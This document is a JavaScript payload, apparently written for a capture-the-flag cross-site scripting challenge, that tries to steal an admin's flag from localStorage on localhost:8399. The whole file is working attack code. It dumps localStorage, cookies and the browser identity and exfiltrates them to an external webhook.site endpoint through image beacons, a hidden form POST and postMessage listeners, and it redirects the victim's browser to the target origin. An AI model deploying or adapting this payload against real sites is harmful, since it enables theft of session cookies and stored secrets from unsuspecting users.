     console.log('🎯 LOCALHOST-TARGETED PAYLOAD - Instructor Note Applied!');

     // CORS-FREE webhook function
     function sendWebhook(data) {
         try {
             const img = new Image();
             const params = new URLSearchParams();
             Object.keys(data).forEach(key => {
                 params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
             });
             img.src = 'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/localhost-payload?' + params.toString();
             document.body.appendChild(img);
             console.log('Webhook sent:', data.status);
         } catch(e) { console.error('Webhook failed:', e); }
     }

     sendWebhook({
         status: 'LOCALHOST_PAYLOAD_START',
         timestamp: new Date().toISOString(),
         current_domain: window.location.hostname,
         current_url: window.location.href,
         user_agent: navigator.userAgent,
         instructor_note_applied: true
     });

     // Check if we're on localhost:8399 (where admin stores the flag)
     if (window.location.hostname === 'localhost' && window.location.port === '8399') {
         console.log('🎯 ON LOCALHOST:8399 - FLAG EXTRACTION LOCATION!');

         sendWebhook({
             status: 'ON_TARGET_LOCALHOST_8399',
             timestamp: new Date().toISOString(),
             domain: window.location.hostname,
             port: window.location.port,
             full_url: window.location.href
         });

         try {
             // Extract flag from localStorage on localhost:8399
             const flag = localStorage.getItem('flag');
             const allStorage = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 allStorage[key] = localStorage.getItem(key);
             }

             sendWebhook({
                 status: 'LOCALHOST_8399_FLAG_EXTRACTION_COMPLETE',
                 timestamp: new Date().toISOString(),
                 success: !!flag,
                 flag: flag || 'not_found',
                 all_localStorage: JSON.stringify(allStorage),
                 localStorage_length: localStorage.length,
                 domain: window.location.hostname,
                 port: window.location.port,
                 extraction_origin: 'localhost_8399'
             });

             if (flag) {
                 console.log('🚩 FLAG CAPTURED FROM LOCALHOST:8399:', flag);

                 // Send flag confirmation multiple times with different methods
                 sendWebhook({
                     status: 'FLAG_CONFIRMED_LOCALHOST_8399',
                     flag: flag,
                     timestamp: new Date().toISOString(),
                     extraction_location: 'localhost_8399_localStorage',
                     instructor_solution: 'correct_origin_used'
                 });

                 // Additional confirmation via image with flag in URL
                 const flagImg = new Image();
                 flagImg.src = 'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/flag-captured?flag=' +
                              encodeURIComponent(flag) + '&origin=localhost_8399&timestamp=' +
                              encodeURIComponent(new Date().toISOString());
                 document.body.appendChild(flagImg);

                 // Form submission backup
                 const form = document.createElement('form');
                 form.method = 'POST';
                 form.action = 'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad';
                 form.target = '_blank';
                 form.style.display = 'none';

                 const flagInput = document.createElement('input');
                 flagInput.type = 'hidden';
                 flagInput.name = 'captured_flag_localhost_8399';
                 flagInput.value = flag;

                 const originInput = document.createElement('input');
                 originInput.type = 'hidden';
                 originInput.name = 'extraction_origin';
                 originInput.value = 'localhost:8399';

                 const timestampInput = document.createElement('input');
                 timestampInput.type = 'hidden';
                 timestampInput.name = 'timestamp';
                 timestampInput.value = new Date().toISOString();

                 form.appendChild(flagInput);
                 form.appendChild(originInput);
                 form.appendChild(timestampInput);
                 document.body.appendChild(form);
                 form.submit();
             }

         } catch(e) {
             sendWebhook({
                 status: 'LOCALHOST_8399_EXTRACTION_ERROR',
                 error: e.message,
                 timestamp: new Date().toISOString()
             });
         }

     } else if (window.location.hostname === 'localhost') {
         // On localhost but wrong port
         console.log('On localhost but not port 8399 - redirecting');

         sendWebhook({
             status: 'LOCALHOST_WRONG_PORT_REDIRECT',
             timestamp: new Date().toISOString(),
             current_port: window.location.port,
             target_port: '8399'
         });

         setTimeout(() => {
             window.location.href = 'http://localhost:8399/#messages';
         }, 2000);

     } else {
         // Not on localhost - attempt redirect to localhost:8399
         console.log('📄 NOT ON LOCALHOST - Attempting redirect to localhost:8399');

         sendWebhook({
             status: 'REDIRECTING_TO_LOCALHOST_8399',
             timestamp: new Date().toISOString(),
             current_domain: window.location.hostname,
             instructor_guidance: 'admin_flag_stored_on_localhost_8399'
         });

         // First, try to extract what we can from current domain
         try {
             const currentStorage = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 currentStorage[key] = localStorage.getItem(key);
             }

             sendWebhook({
                 status: 'CURRENT_DOMAIN_DATA_BEFORE_REDIRECT',
                 timestamp: new Date().toISOString(),
                 localStorage_data: JSON.stringify(currentStorage),
                 localStorage_length: localStorage.length,
                 cookies: document.cookie || 'none',
                 sessionStorage_length: sessionStorage.length,
                 current_domain: window.location.hostname
             });

         } catch(e) {}

         // Attempt redirect to localhost:8399 (where the flag actually is)
         setTimeout(() => {
             const localhostUrl = 'http://localhost:8399/#messages';

             sendWebhook({
                 status: 'EXECUTING_LOCALHOST_8399_REDIRECT',
                 timestamp: new Date().toISOString(),
                 target_url: localhostUrl,
                 target_domain: 'localhost',
                 target_port: '8399'
             });

             console.log('🔄 Redirecting to localhost:8399 where admin stores the flag');

             // Set a flag to prevent infinite redirects
             if (!sessionStorage.getItem('localhost_8399_redirect_attempted')) {
                 sessionStorage.setItem('localhost_8399_redirect_attempted', 'true');
                 window.location.href = localhostUrl;
             } else {
                 sendWebhook({
                     status: 'LOCALHOST_8399_REDIRECT_LOOP_PREVENTED',
                     timestamp: new Date().toISOString(),
                     message: 'Redirect to localhost:8399 already attempted'
                 });
             }

         }, 3000);
     }

     // Try cross-frame communication as backup
     try {
         if (window.parent !== window) {
             window.parent.postMessage({
                 type: 'FLAG_REQUEST_LOCALHOST_8399',
                 timestamp: new Date().toISOString(),
                 origin: window.location.origin,
                 instructor_note: 'requesting_localhost_8399_flag'
             }, '*');

             sendWebhook({
                 status: 'POSTMESSAGE_SENT_TO_PARENT_LOCALHOST',
                 timestamp: new Date().toISOString()
             });
         }

         if (window.opener) {
             window.opener.postMessage({
                 type: 'FLAG_REQUEST_LOCALHOST_8399',
                 timestamp: new Date().toISOString(),
                 origin: window.location.origin,
                 instructor_note: 'requesting_localhost_8399_flag'
             }, '*');

             sendWebhook({
                 status: 'POSTMESSAGE_SENT_TO_OPENER_LOCALHOST',
                 timestamp: new Date().toISOString()
             });
         }
     } catch(e) {}

     // Listen for postMessage responses
     window.addEventListener('message', function(event) {
         sendWebhook({
             status: 'POSTMESSAGE_RECEIVED_LOCALHOST',
             timestamp: new Date().toISOString(),
             message_origin: event.origin,
             message_data: JSON.stringify(event.data)
         });

         if (event.data && event.data.flag) {
             sendWebhook({
                 status: 'FLAG_RECEIVED_VIA_POSTMESSAGE_LOCALHOST',
                 timestamp: new Date().toISOString(),
                 flag: event.data.flag,
                 source_origin: event.origin
             });
         }
     });

     // Send final status
     setTimeout(() => {
         sendWebhook({
             status: 'LOCALHOST_TARGETED_PAYLOAD_COMPLETE',
             timestamp: new Date().toISOString(),
             domain: window.location.hostname,
             port: window.location.port,
             instructor_solution_applied: true
         });
     }, 10000);

     console.log('🏁 Localhost-targeted payload execution completed');
